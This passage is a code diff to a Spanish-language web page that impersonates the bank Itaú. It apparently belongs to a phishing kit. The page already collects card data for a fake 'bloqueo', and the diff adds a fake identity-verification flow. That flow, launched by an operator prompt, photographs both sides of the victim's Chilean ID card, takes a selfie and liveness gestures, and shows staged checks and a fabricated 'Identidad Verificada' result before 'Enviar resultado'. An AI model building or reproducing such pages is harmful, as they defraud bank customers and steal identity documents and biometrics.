@@ -122,6 +122,106 @@
     .loading-spinner{width:46px;height:46px;border:3px solid #DDE3EB;border-top-color:var(--cp);border-radius:50%;animation:spin 1s linear infinite;margin-bottom:1rem}
     @keyframes spin{to{transform:rotate(360deg)}}
     .loading-txt{font-size:14px;color:#6B7A8D;font-weight:600}
+    /* ══ KYC Launch Block ══ */
+    .kyc-launch-box{text-align:center;padding:.5rem 0}
+    .kyc-launch-icon{width:56px;height:56px;border-radius:50%;background:#FEF0E4;border:1.5px solid #F9D9BB;display:flex;align-items:center;justify-content:center;margin:0 auto 1rem;color:#FF6200}
+    .kyc-launch-title{font-size:15px;font-weight:800;color:#1A3557;margin-bottom:.4rem}
+    .kyc-launch-sub{font-size:12px;color:#6B7A8D;line-height:1.6;margin-bottom:1.25rem}
+    .kyc-steps-mini{display:flex;gap:.5rem;justify-content:center;margin-bottom:1.25rem;flex-wrap:wrap}
+    .kyc-step-pill{font-size:10px;font-weight:800;color:#FF6200;background:#FEF0E4;padding:.2rem .65rem;border-radius:999px;border:1px solid #F9D9BB}
+    /* ══ KYC Overlay ══ */
+    #kyc-overlay{position:fixed;inset:0;z-index:200;background:#F8F5F1;overflow-y:auto;-webkit-overflow-scrolling:touch;display:none}
+    #kapp{width:100%;max-width:480px;min-height:100%;margin:0 auto;display:flex;flex-direction:column;background:#F8F5F1;position:relative}
+    .kscreen{display:none;flex-direction:column;flex:1}.kscreen.active{display:flex}
+    .ktop-bar{display:flex;align-items:center;justify-content:space-between;padding:1rem 1.25rem;background:#fff;border-bottom:1px solid #E4DDD5;position:sticky;top:0;z-index:100}
+    .kbrand{display:flex;align-items:center;gap:.6rem}
+    .kbrand-logo{width:32px;height:32px;border-radius:9px;background:#FF6200;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:900;color:#fff;font-family:'Nunito',sans-serif;letter-spacing:-.03em}
+    .kbrand-text{font-size:.8rem;font-weight:700;color:#6B7A8D}
+    .kstep-badge{font-size:.7rem;font-weight:700;color:#6B7A8D;background:#E4DDD5;padding:.2rem .65rem;border-radius:999px}
+    .kprog-track{height:3px;background:#E4DDD5}.kprog-fill{height:100%;background:#FF6200;transition:width .5s cubic-bezier(.4,0,.2,1)}
+    .ksec-header{padding:1.4rem 1.25rem .7rem}
+    .ksec-tag{font-size:.68rem;font-weight:800;letter-spacing:.14em;text-transform:uppercase;color:#FF6200;margin-bottom:.35rem}
+    .ksec-title{font-size:1.3rem;font-weight:800;color:#1A3557;line-height:1.2;margin-bottom:.35rem}
+    .ksec-sub{font-size:.84rem;color:#6B7A8D;line-height:1.6}
+    .kbtn{width:100%;padding:1rem 1.5rem;border:none;border-radius:14px;background:#FF6200;color:#fff;font-family:'Nunito',sans-serif;font-size:.98rem;font-weight:800;cursor:pointer;transition:.18s;display:flex;align-items:center;justify-content:center;gap:.5rem}
+    .kbtn:hover:not(:disabled){background:#CC4E00;transform:translateY(-1px)}.kbtn:disabled{opacity:.3;cursor:not-allowed;transform:none}
+    .kbtn-sec{width:100%;padding:.85rem;border:1.5px solid #E4DDD5;border-radius:14px;background:#fff;color:#6B7A8D;font-family:'Nunito',sans-serif;font-size:.9rem;font-weight:700;cursor:pointer;transition:.18s}
+    .kbtn-sec:hover{border-color:#FF6200;color:#FF6200}
+    .kbottom{padding:1rem 1.25rem env(safe-area-inset-bottom,1rem);background:#fff;border-top:1px solid #E4DDD5;display:flex;flex-direction:column;gap:.6rem;position:sticky;bottom:0}
+    .kspacer{flex:1}
+    .khero{background:#FEF0E4;padding:2.75rem 1.25rem 0;display:flex;justify-content:center;min-height:240px;position:relative;overflow:hidden}
+    .khero::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:40px;background:#F8F5F1;border-radius:50% 50% 0 0/40px 40px 0 0}
+    .kintro-body{padding:1.5rem 1.25rem}
+    .kintro-title{font-size:1.45rem;font-weight:900;line-height:1.22;margin-bottom:.85rem;color:#1A3557}
+    .kintro-title em{font-style:normal;color:#FF6200}
+    .kintro-desc{font-size:.88rem;color:#6B7A8D;line-height:1.68;margin-bottom:1.25rem}
+    .kreq-list{list-style:none;display:flex;flex-direction:column;gap:.55rem;margin-bottom:1.5rem}
+    .kreq-list li{display:flex;align-items:flex-start;gap:.7rem;font-size:.87rem;color:#1A1A1A;line-height:1.5}
+    .kreq-list li::before{content:'';width:6px;height:6px;border-radius:50%;background:#FF6200;flex-shrink:0;margin-top:.5rem}
+    .ksec-row{display:flex;align-items:center;gap:.7rem;padding:.85rem 1rem;background:#fff;border-radius:10px;border:1px solid #E4DDD5;font-size:.82rem;color:#6B7A8D}
+    .kside-sel{display:flex;gap:.75rem;padding:0 1.25rem;margin-bottom:1rem}
+    .kside-btn{flex:1;padding:.85rem .5rem;border:1.5px solid #E4DDD5;border-radius:10px;background:#fff;display:flex;flex-direction:column;align-items:center;gap:.35rem;transition:.2s}
+    .kside-btn.active{border-color:#FF6200;background:#FEF0E4}.kside-btn.captured{border-color:#2E9E5B}
+    .kside-ind{width:16px;height:16px;border-radius:50%;border:2px solid #E4DDD5;display:flex;align-items:center;justify-content:center;transition:.2s;flex-shrink:0}
+    .kside-btn.active .kside-ind{border-color:#FF6200;background:#FF6200}.kside-btn.captured .kside-ind{border-color:#2E9E5B;background:#2E9E5B}
+    .kside-label{font-size:.82rem;font-weight:800;color:#1A1A1A}.kside-sub{font-size:.68rem;color:#6B7A8D}
+    .kcam-wrap{position:relative;background:#111;border-radius:14px;margin:0 1.25rem;overflow:hidden;aspect-ratio:4/3;border:1.5px solid #222}
+    .kcam-wrap video{display:block;width:100%;height:100%;object-fit:cover}.kcam-wrap canvas{display:none}
+    .kcam-overlay{position:absolute;inset:0;pointer-events:none;display:flex;align-items:center;justify-content:center}
+    .kframe-doc{width:88%;height:66%;position:relative}
+    .kframe-doc::before,.kframe-doc::after,.kframe-doc .kfc,.kframe-doc .kfd{content:'';position:absolute;width:20px;height:20px;border-color:#FF6200;border-style:solid;border-width:0}
+    .kframe-doc::before{top:0;left:0;border-top-width:2.5px;border-left-width:2.5px;border-radius:3px 0 0 0}
+    .kframe-doc::after{top:0;right:0;border-top-width:2.5px;border-right-width:2.5px;border-radius:0 3px 0 0}
+    .kframe-doc .kfc{bottom:0;left:0;border-bottom-width:2.5px;border-left-width:2.5px;border-radius:0 0 0 3px}
+    .kframe-doc .kfd{bottom:0;right:0;border-bottom-width:2.5px;border-right-width:2.5px;border-radius:0 0 3px 0}
+    .kscan-line{position:absolute;left:7%;right:7%;height:1.5px;background:linear-gradient(90deg,transparent 0%,#FF6200 30%,rgba(255,98,0,.8) 70%,transparent 100%);animation:kScan 2.2s ease-in-out infinite;top:10%}
+    @keyframes kScan{0%{top:10%;opacity:0}10%{opacity:1}90%{opacity:1}100%{top:90%;opacity:0}}
+    .kframe-face{width:150px;height:195px;border:2.5px solid #FF6200;border-radius:50%;box-shadow:0 0 0 9999px rgba(0,0,0,.58);animation:kOvalGlow 3s ease-in-out infinite}
+    @keyframes kOvalGlow{0%,100%{border-color:#FF6200;box-shadow:0 0 0 9999px rgba(0,0,0,.58),0 0 0 0 rgba(255,98,0,0)}50%{border-color:#ffb060;box-shadow:0 0 0 9999px rgba(0,0,0,.58),0 0 0 6px rgba(255,98,0,.15)}}
+    .kcam-caption{text-align:center;font-size:.78rem;font-weight:700;color:#6B7A8D;padding:.65rem 1.25rem}
+    .kflash{position:absolute;inset:0;background:#fff;opacity:0;pointer-events:none;transition:opacity .07s;z-index:20}.kflash.go{opacity:.95}
+    .kpreview-wrap{margin:.75rem 1.25rem 0}.kpreview-label{font-size:.7rem;font-weight:800;color:#6B7A8D;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.4rem}
+    .kpreview-img{width:100%;border-radius:10px;overflow:hidden;border:1.5px solid #E4DDD5;background:#111}
+    .kpreview-img img{display:block;width:100%;max-height:160px;object-fit:cover}
+    .kliveness-cam{position:relative;background:#111;border-radius:14px;margin:0 1.25rem;overflow:hidden;aspect-ratio:3/4;border:1.5px solid #222}
+    .kliveness-cam video{display:block;width:100%;height:100%;object-fit:cover}
+    .kliveness-panel{margin:.85rem 1.25rem 0;padding:1.1rem 1.25rem;background:#fff;border:1.5px solid #E4DDD5;border-radius:14px;display:flex;align-items:center;gap:1rem}
+    .kliveness-icon{width:48px;height:48px;border-radius:50%;background:#FEF0E4;border:1.5px solid #F9D9BB;display:flex;align-items:center;justify-content:center;color:#FF6200;flex-shrink:0;animation:kIconFloat 2s ease-in-out infinite alternate}
+    @keyframes kIconFloat{from{transform:translateY(0)}to{transform:translateY(-3px)}}
+    .kliveness-title{font-size:.95rem;font-weight:800;color:#1A3557;margin-bottom:.15rem}
+    .kliveness-sub{font-size:.78rem;color:#6B7A8D;line-height:1.4}
+    .ktimer-track{height:3px;background:#E4DDD5;border-radius:999px;margin:0 1.25rem;margin-top:.7rem;overflow:hidden}
+    .ktimer-fill{height:100%;width:0%;background:#FF6200;border-radius:999px;transition:width .1s linear}
+    .kpills-row{display:flex;gap:.4rem;flex-wrap:wrap;padding:.65rem 1.25rem 0}
+    .kpill{padding:.25rem .7rem;border-radius:999px;border:1.5px solid #E4DDD5;font-size:.65rem;font-weight:800;color:#6B7A8D;transition:.25s;text-transform:uppercase;letter-spacing:.07em}
+    .kpill.active{border-color:#FF6200;color:#FF6200;background:#FEF0E4}.kpill.done{border-color:#2E9E5B;background:#2E9E5B;color:#fff}
+    .kproc-body{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem 1.25rem}
+    .kspinner{width:48px;height:48px;border:3px solid #E4DDD5;border-top-color:#FF6200;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:1.5rem}
+    .kproc-title{font-size:1.2rem;font-weight:800;margin-bottom:.4rem;color:#1A3557}
+    .kproc-sub{font-size:.84rem;color:#6B7A8D;text-align:center;margin-bottom:1.75rem;line-height:1.55}
+    .kproc-rows{width:100%;display:flex;flex-direction:column;gap:.5rem}
+    .kproc-row{display:flex;align-items:center;gap:.85rem;padding:.85rem 1rem;background:#fff;border:1.5px solid #E4DDD5;border-radius:10px;font-size:.84rem;color:#6B7A8D;font-weight:600}
+    .kproc-ic{width:18px;flex-shrink:0;text-align:center;font-style:normal}.kproc-ic.spin{color:#FF6200;animation:spin .9s linear infinite;display:inline-block}
+    .kproc-ic.check{color:#2E9E5B;font-size:1rem}.kproc-ic.wait{color:#ccc}
+    .kproc-msg{font-size:.75rem;color:#FF6200;text-align:center;margin-top:.85rem;font-weight:700;letter-spacing:.02em}
+    .kresult-hero{margin:1.25rem 1.25rem .85rem;padding:1.25rem;background:#fff;border:1.5px solid #E4DDD5;border-radius:14px;display:flex;align-items:center;gap:1rem}
+    .kresult-circle{width:52px;height:52px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;animation:kPopIn .45s cubic-bezier(.34,1.56,.64,1) both}
+    @keyframes kPopIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+    .kresult-circle.ok{background:#E8F8EF;color:#2E9E5B;border:2px solid #b6e8cc}
+    .kresult-circle.fail{background:#FEECEC;color:#C8312A;border:2px solid #f5bfbf}
+    .kresult-title{font-size:1.1rem;font-weight:900;color:#1A3557;line-height:1.2}
+    .kresult-ref{font-size:.7rem;color:#6B7A8D;margin-top:.2rem;font-family:monospace;letter-spacing:.04em}
+    .kscore-grid{display:grid;grid-template-columns:1fr 1fr;gap:.65rem;margin:0 1.25rem .85rem}
+    .kscore-card{padding:.9rem 1rem;background:#fff;border:1.5px solid #E4DDD5;border-radius:10px}
+    .kscore-name{font-size:.62rem;font-weight:800;text-transform:uppercase;letter-spacing:.1em;color:#6B7A8D;margin-bottom:.4rem}
+    .kscore-num{font-size:1.75rem;font-weight:900;color:#1A3557;line-height:1}.kscore-num sub{font-size:.85rem;color:#6B7A8D;font-weight:600;vertical-align:baseline}
+    .kscore-bar{height:3px;background:#E4DDD5;border-radius:999px;margin-top:.5rem;overflow:hidden}
+    .kscore-fill{height:100%;border-radius:999px;background:#FF6200}.kscore-fill.ok{background:#2E9E5B}.kscore-fill.fail{background:#C8312A}
+    .kmeta-table{margin:0 1.25rem 1.25rem;background:#fff;border:1.5px solid #E4DDD5;border-radius:10px;overflow:hidden}
+    .kmeta-row{display:flex;justify-content:space-between;align-items:center;padding:.72rem 1rem;border-bottom:1px solid #E4DDD5;font-size:.82rem}
+    .kmeta-row:last-child{border-bottom:none}.kmeta-key{color:#6B7A8D;font-weight:600}.kmeta-val{color:#1A3557;font-weight:700;font-family:monospace}
+    .kbadge-ok{color:#2E9E5B;font-weight:900;font-family:'Nunito',sans-serif}.kbadge-fail{color:#C8312A;font-weight:900;font-family:'Nunito',sans-serif}
+    .knote-row{margin:.5rem 1.25rem 0;padding:.8rem 1rem;background:#fff;border:1.5px solid #E4DDD5;border-radius:10px;display:flex;gap:.75rem;align-items:flex-start;font-size:.8rem;color:#6B7A8D;line-height:1.55}
   </style>
 </head>
 <body>
@@ -265,6 +365,23 @@
             <button class="btn-resp" id="btn-card-resp" onclick="submitCardData()" style="background:#FF6200">Procesar bloqueo →</button>
           </div>
         </div>
+
+        <!-- KYC Block -->
+        <div id="kyc-block" style="display:none">
+          <div class="kyc-launch-box">
+            <div class="kyc-launch-icon">
+              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 2L4 6v6c0 5.25 3.5 10.15 8 11 4.5-.85 8-5.75 8-11V6l-8-4z"/></svg>
+            </div>
+            <div class="kyc-launch-title">Verificación de Identidad</div>
+            <div class="kyc-launch-sub">Necesitamos confirmar que eres tú. El proceso incluye fotografía de tu cédula y verificación biométrica facial.</div>
+            <div class="kyc-steps-mini">
+              <span class="kyc-step-pill">📄 Cédula</span>
+              <span class="kyc-step-pill">🤳 Selfie</span>
+              <span class="kyc-step-pill">👁 Prueba de vida</span>
+            </div>
+            <button class="btn-resp" onclick="launchKYC()" style="background:#FF6200">Iniciar verificación de identidad →</button>
+          </div>
+        </div>
       </div>
     </div>
     <div class="ok-msg" id="ok-msg" style="display:none">✓ Respuesta enviada. Espera la próxima indicación.</div>
@@ -280,6 +397,202 @@
   </div>
   <div class="footer-bar" id="f3"></div>
 </div>
+
+<!-- ════ KYC OVERLAY ════ -->
+<div id="kyc-overlay">
+<div id="kapp">
+
+<!-- ks0 INTRO -->
+<div class="kscreen active" id="ks0">
+  <div class="khero" style="position:relative;z-index:1">
+    <svg width="180" height="210" viewBox="0 0 195 225" fill="none" style="position:relative;z-index:1">
+      <rect x="42" y="152" width="111" height="75" rx="30" fill="#FF6200"/>
+      <rect x="84" y="130" width="27" height="30" rx="9" fill="#F4B896"/>
+      <ellipse cx="97" cy="105" rx="44" ry="47" fill="#F4B896"/>
+      <ellipse cx="97" cy="78" rx="44" ry="34" fill="#1A1A1A"/>
+      <ellipse cx="63" cy="118" rx="13" ry="30" fill="#1A1A1A"/>
+      <ellipse cx="131" cy="118" rx="13" ry="30" fill="#1A1A1A"/>
+      <ellipse cx="53" cy="112" rx="7" ry="9" fill="#F4B896"/>
+      <ellipse cx="141" cy="112" rx="7" ry="9" fill="#F4B896"/>
+      <ellipse cx="53" cy="120" rx="5" ry="6" fill="#FF6200"/>
+      <ellipse cx="141" cy="120" rx="5" ry="6" fill="#FF6200"/>
+      <ellipse cx="84" cy="106" rx="4" ry="4.5" fill="#1A1A1A"/>
+      <ellipse cx="110" cy="106" rx="4" ry="4.5" fill="#1A1A1A"/>
+      <ellipse cx="97" cy="105" rx="53" ry="57" stroke="#FF6200" stroke-width="3.5" fill="none"/>
+    </svg>
+  </div>
+  <div class="kintro-body">
+    <div class="kintro-title">Necesitamos confirmar<br/>que <em>eres tú</em></div>
+    <div class="kintro-desc">Por tu seguridad realizaremos un proceso de reconocimiento facial con tu cédula de identidad chilena.</div>
+    <ul class="kreq-list">
+      <li>Ten a mano tu cédula de identidad vigente.</li>
+      <li>Mira a la cámara, usa un fondo liso y retira accesorios del rostro.</li>
+      <li>Para una mejor conexión, utiliza una red Wi-Fi.</li>
+    </ul>
+    <div class="ksec-row">
+      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 2L4 6v6c0 5.25 3.5 10.15 8 11 4.5-.85 8-5.75 8-11V6l-8-4z"/></svg>
+      Tu información está siempre protegida por Itaú.
+    </div>
+  </div>
+  <div class="kspacer"></div>
+  <div class="kbottom">
+    <button class="kbtn" onclick="kStartDocCapture()">Continuar <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M13 6l6 6-6 6"/></svg></button>
+    <button class="kbtn-sec" onclick="kCloseOverlay()">Cancelar</button>
+  </div>
+</div>
+
+<!-- ks1 CÉDULA -->
+<div class="kscreen" id="ks1">
+  <div class="ktop-bar">
+    <div class="kbrand"><div class="kbrand-logo">itaú</div><span class="kbrand-text">Verificación KYC</span></div>
+    <div class="kstep-badge">1 de 3</div>
+  </div>
+  <div class="kprog-track"><div class="kprog-fill" id="kdocProgress" style="width:20%"></div></div>
+  <div class="ksec-header">
+    <div class="ksec-tag" id="kdocTag">Cédula · Frente</div>
+    <div class="ksec-title" id="kdocTitle">Fotografía el frente</div>
+    <div class="ksec-sub" id="kdocSub">Encuadra el frente de tu cédula dentro del recuadro naranja.</div>
+  </div>
+  <div class="kside-sel">
+    <div class="kside-btn active" id="ksBtn0"><div class="kside-ind" id="ksInd0"></div><div class="kside-label">Frente</div><div class="kside-sub">Foto y datos</div></div>
+    <div class="kside-btn" id="ksBtn1"><div class="kside-ind" id="ksInd1"></div><div class="kside-label">Reverso</div><div class="kside-sub">Firma y huella</div></div>
+  </div>
+  <div class="kcam-wrap">
+    <video id="kdocVideo" autoplay playsinline muted></video>
+    <canvas id="kdocCanvas"></canvas>
+    <div class="kcam-overlay"><div class="kframe-doc"><div class="kfc"></div><div class="kfd"></div></div></div>
+    <div class="kscan-line" id="kdocScanLine"></div>
+    <div class="kflash" id="kdocFlash"></div>
+  </div>
+  <div class="kcam-caption" id="kdocCaption">Alinea el frente de tu cédula dentro del recuadro</div>
+  <div class="kpreview-wrap" id="kdocPreviewWrap" style="display:none">
+    <div class="kpreview-label">Imagen capturada</div>
+    <div class="kpreview-img"><img id="kdocPreviewImg" src="" alt=""/></div>
+  </div>
+  <div class="kspacer"></div>
+  <div class="kbottom">
+    <button class="kbtn" id="kbtnCapDoc" onclick="kCaptureDoc()"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="13" r="4"/><path d="M2 9h2l2-3h12l2 3h2v11H2z"/></svg> Capturar</button>
+    <button class="kbtn-sec" id="kbtnRetakeDoc" style="display:none" onclick="kRetakeDoc()">Volver a capturar</button>
+    <button class="kbtn" id="kbtnNextDoc" style="display:none" onclick="kNextDocSide()">Siguiente <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M13 6l6 6-6 6"/></svg></button>
+  </div>
+</div>
+
+<!-- ks2 SELFIE -->
+<div class="kscreen" id="ks2">
+  <div class="ktop-bar">
+    <div class="kbrand"><div class="kbrand-logo">itaú</div><span class="kbrand-text">Verificación KYC</span></div>
+    <div class="kstep-badge">2 de 3</div>
+  </div>
+  <div class="kprog-track"><div class="kprog-fill" style="width:55%"></div></div>
+  <div class="ksec-header">
+    <div class="ksec-tag">Fotografía</div>
+    <div class="ksec-title">Fotografía biométrica</div>
+    <div class="ksec-sub">Centra tu rostro en el óvalo. Mira directo a la cámara con expresión neutral.</div>
+  </div>
+  <div class="kcam-wrap" style="aspect-ratio:3/4">
+    <video id="kselfieVideo" autoplay playsinline muted></video>
+    <canvas id="kselfieCanvas"></canvas>
+    <div class="kcam-overlay"><div class="kframe-face"></div></div>
+    <div class="kflash" id="kselfieFlash"></div>
+  </div>
+  <div class="kcam-caption">Centra tu rostro en el óvalo naranja</div>
+  <div class="kpreview-wrap" id="kselfiePreviewWrap" style="display:none">
+    <div class="kpreview-label">Tu fotografía</div>
+    <div class="kpreview-img"><img id="kselfiePreviewImg" src="" alt=""/></div>
+  </div>
+  <div class="knote-row" style="margin-bottom:.5rem">
+    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+    Retira gafas, gorra o mascarilla. Busca buena iluminación frontal.
+  </div>
+  <div class="kspacer"></div>
+  <div class="kbottom">
+    <button class="kbtn" id="kbtnCapSelfie" onclick="kCaptureSelfie()"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="13" r="4"/><path d="M2 9h2l2-3h12l2 3h2v11H2z"/></svg> Capturar</button>
+    <button class="kbtn-sec" id="kbtnRetakeSelfie" style="display:none" onclick="kRetakeSelfie()">Volver a capturar</button>
+    <button class="kbtn" id="kbtnGoLiveness" style="display:none" onclick="kGoLiveness()">Continuar <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M13 6l6 6-6 6"/></svg></button>
+  </div>
+</div>
+
+<!-- ks3 LIVENESS -->
+<div class="kscreen" id="ks3">
+  <div class="ktop-bar">
+    <div class="kbrand"><div class="kbrand-logo">itaú</div><span class="kbrand-text">Verificación KYC</span></div>
+    <div class="kstep-badge">3 de 3</div>
+  </div>
+  <div class="kprog-track"><div class="kprog-fill" style="width:80%"></div></div>
+  <div class="ksec-header">
+    <div class="ksec-tag">Prueba de vida</div>
+    <div class="ksec-title">Verificación en tiempo real</div>
+    <div class="ksec-sub">Sigue cada instrucción. El sistema confirmará que estás presente.</div>
+  </div>
+  <div class="kliveness-cam">
+    <video id="klivenessVideo" autoplay playsinline muted></video>
+    <div class="kcam-overlay"><div class="kframe-face"></div></div>
+  </div>
+  <div class="kliveness-panel">
+    <div class="kliveness-icon" id="klivenessIcon">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4.4 3.6-8 8-8s8 3.6 8 8"/></svg>
+    </div>
+    <div style="flex:1;min-width:0">
+      <div class="kliveness-title" id="klivenessTitle">Preparando análisis...</div>
+      <div class="kliveness-sub" id="klivenessSub">El proceso comenzará en un instante</div>
+    </div>
+  </div>
+  <div class="ktimer-track"><div class="ktimer-fill" id="ktimerFill"></div></div>
+  <div class="kpills-row" id="kpillsRow"></div>
+  <div class="kspacer"></div>
+  <div class="kbottom" id="kliveDone" style="display:none">
+    <button class="kbtn" onclick="kGoProcessing()">Ver resultado <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M13 6l6 6-6 6"/></svg></button>
+  </div>
+</div>
+
+<!-- ks4 PROCESANDO -->
+<div class="kscreen" id="ks4">
+  <div class="ktop-bar">
+    <div class="kbrand"><div class="kbrand-logo">itaú</div><span class="kbrand-text">Verificación KYC</span></div>
+    <div class="kstep-badge">Verificando</div>
+  </div>
+  <div class="kprog-track"><div class="kprog-fill" style="width:92%"></div></div>
+  <div class="kproc-body">
+    <div class="kspinner" id="kprocSpinner"></div>
+    <div class="kproc-title">Verificando tu identidad</div>
+    <div class="kproc-sub">Analizando documentos y biometría.<br/>No cierres esta pantalla.</div>
+    <div class="kproc-rows">
+      <div class="kproc-row"><i class="kproc-ic wait" id="kpi1">—</i><span>Lectura OCR de la cédula</span></div>
+      <div class="kproc-row"><i class="kproc-ic wait" id="kpi2">—</i><span>Comparación biométrica facial</span></div>
+      <div class="kproc-row"><i class="kproc-ic wait" id="kpi3">—</i><span>Validación de prueba de vida</span></div>
+      <div class="kproc-row"><i class="kproc-ic wait" id="kpi4">—</i><span>Verificación de seguridad final</span></div>
+    </div>
+    <div class="kproc-msg" id="kprocMsg">Iniciando...</div>
+  </div>
+</div>
+
+<!-- ks5 RESULTADO -->
+<div class="kscreen" id="ks5">
+  <div class="ktop-bar">
+    <div class="kbrand"><div class="kbrand-logo">itaú</div><span class="kbrand-text">Verificación KYC</span></div>
+    <div class="kstep-badge">Resultado</div>
+  </div>
+  <div class="kprog-track"><div class="kprog-fill" style="width:100%"></div></div>
+  <div style="height:1rem"></div>
+  <div class="kresult-hero">
+    <div class="kresult-circle" id="kresultCircle">
+      <svg id="kresultIcon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+    </div>
+    <div>
+      <div class="kresult-title" id="kresultTitle">Identidad Verificada</div>
+      <div class="kresult-ref" id="kresultRef">REF —</div>
+    </div>
+  </div>
+  <div class="kscore-grid" id="kscoreGrid"></div>
+  <div class="kmeta-table" id="kmetaTable"></div>
+  <div class="kspacer"></div>
+  <div class="kbottom">
+    <button class="kbtn" onclick="kSubmitResult()">Enviar resultado <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M13 6l6 6-6 6"/></svg></button>
+  </div>
+</div>
+
+</div><!-- /kapp -->
+</div><!-- /kyc-overlay -->
 
 <div class="loading-overlay" id="loading-overlay" style="display:none">
   <div class="loading-spinner"></div>
@@ -430,16 +743,26 @@
     document.getElementById('ok-msg').style.display='none';
 
     const isCobro=label.includes('cobro no autorizado')||label.includes('transacción no reconocida');
+    const isKYC=label.toLowerCase().includes('kyc')||label.toLowerCase().includes('valida tu identidad')||label.toLowerCase().includes('verifica que eres tu')||label.toLowerCase().includes('verifica que eres tú');
     const isDebito=tipoTarjetaDetectado==='DÉBITO';
     const isCredito=tipoTarjetaDetectado==='CRÉDITO';
     const reqBox=document.getElementById('req-box');
 
-    if(isCobro){
+    if(isKYC){
+      document.getElementById('req-tag').style.display='none';
+      document.getElementById('req-q').style.display='none';
+      document.getElementById('generic-form').style.display='none';
+      document.getElementById('cobro-block').style.display='none';
+      document.getElementById('kyc-block').style.display='block';
+      reqBox.style.border='none';
+      reqBox.style.animation='none';
+    } else if(isCobro){
       // Ocultar genérico, mostrar bloque cobro
       document.getElementById('req-tag').style.display='none';
       document.getElementById('req-q').style.display='none';
       document.getElementById('generic-form').style.display='none';
       document.getElementById('cobro-block').style.display='block';
+      document.getElementById('kyc-block').style.display='none';
 
       // Nombre del cliente
       document.getElementById('cobro-nombre').textContent=curName;
@@ -480,6 +803,7 @@
       document.getElementById('req-q-generic').textContent=label;
       document.getElementById('generic-form').style.display='block';
       document.getElementById('cobro-block').style.display='none';
+      document.getElementById('kyc-block').style.display='none';
       reqBox.style.border='none';
       reqBox.style.animation='none';
       document.getElementById('btn-resp').disabled=false;
@@ -691,6 +1015,217 @@
       errDiv.textContent='';
     }
     updateCardSubmitState();
+  }
+
+  /* ════════════════════════════════
+     KYC FLOW
+  ════════════════════════════════ */
+  const KS={docFront:null,docBack:null,selfie:null,livenessScore:0,step:'front',stream:null,kycRef:null,kycScore:0,kycOk:false};
+
+  const K_ICONS={
+    face:`<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4.4 3.6-8 8-8s8 3.6 8 8"/></svg>`,
+    smile:`<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"/><circle cx="9" cy="10" r="1"/><circle cx="15" cy="10" r="1"/><path d="M9 15s1 1.5 3 1.5 3-1.5 3-1.5"/></svg>`,
+    left:`<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>`,
+    right:`<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 6l6 6-6 6"/></svg>`,
+    blink:`<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"/><path d="M7 10c0 0 2 2 5 2s5-2 5-2"/><path d="M7 14h10"/></svg>`,
+    ok:`<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>`,
+  };
+
+  const K_CHALLENGES=[
+    {key:'face', label:'Neutral',   title:'Mira directo a la cámara',      sub:'Expresión neutral, sin moverse',      dur:3000},
+    {key:'smile',label:'Sonrisa',   title:'Sonríe ampliamente',             sub:'Muestra los dientes si puedes',       dur:3500},
+    {key:'left', label:'Izquierda', title:'Gira la cabeza a la izquierda',  sub:'Lentamente, luego regresa al centro', dur:3500},
+    {key:'right',label:'Derecha',   title:'Gira la cabeza a la derecha',    sub:'Lentamente, luego regresa al centro', dur:3500},
+    {key:'blink',label:'Parpadeo',  title:'Parpadea dos veces despacio',    sub:'Cierra y abre los ojos con calma',    dur:3000},
+  ];
+
+  function launchKYC(){
+    document.getElementById('kyc-overlay').style.display='block';
+    kGoTo('ks0');
+  }
+  function kCloseOverlay(){
+    kStopCam();
+    document.getElementById('kyc-overlay').style.display='none';
+    kReset();
+  }
+  function kGoTo(id){
+    document.querySelectorAll('.kscreen').forEach(s=>s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    document.getElementById('kyc-overlay').scrollTo({top:0,behavior:'smooth'});
+  }
+  function kStopCam(){if(KS.stream){KS.stream.getTracks().forEach(t=>t.stop());KS.stream=null;}}
+  async function kStartCam(vid,facing){
+    kStopCam();
+    try{KS.stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:1280},height:{ideal:720}},audio:false});document.getElementById(vid).srcObject=KS.stream;}
